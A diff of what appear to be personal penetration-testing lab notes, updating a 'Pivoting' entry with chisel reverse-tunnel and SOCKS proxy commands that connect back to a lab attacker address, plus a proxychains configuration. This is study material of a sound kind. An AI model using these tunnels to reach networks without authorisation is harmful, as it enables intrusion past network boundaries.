@@ -12853,7 +12853,7 @@ void OnTriggerExit(Collider coll)
 }
 ```</pre>
 </div>
-<div created="20210901152347409" modified="20211116150135701" title="Pivoting" type="">
+<div created="20210901152347409" modified="20211116154212158" title="Pivoting" type="">
 <pre>Pivoting is basically gaining access to other networks (that were initially inaccessible)
 
 !! SSH
@@ -12867,11 +12867,36 @@ ssh -L5901:127.0.0.1:5901 charix@10.10.10.84
 !! Chisel
 
 https://github.com/jpillora/chisel 
+https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 
 ```
  ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
 .\chisel.exe client 10.10.14.20:8000 R:8888:localhost:8888
-# &lt;local-host&gt;:&lt;local-port&gt;:&lt;remote-host&gt;:&lt;remote-port&gt;/&lt;protocol&gt;
+# R:&lt;local-port&gt;:&lt;remote-host&gt;:&lt;remote-port&gt;/&lt;protocol&gt;
+```
+
+or 
+
+```
+.\chisel.exe client 10.10.14.20:8000 R:socks
+```
+
+Make sure to configure proxychains to use socks5 proxy
+
+```
+┌──(kali㉿kali)-[~]
+└─$ tail /etc/proxychains.conf
+#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &quot;tor&quot;
+#socks4         127.0.0.1 9050
+
+# Metasploit
+socks5 127.0.0.1 1080
+                       
 ```
 
 !! Metasploit
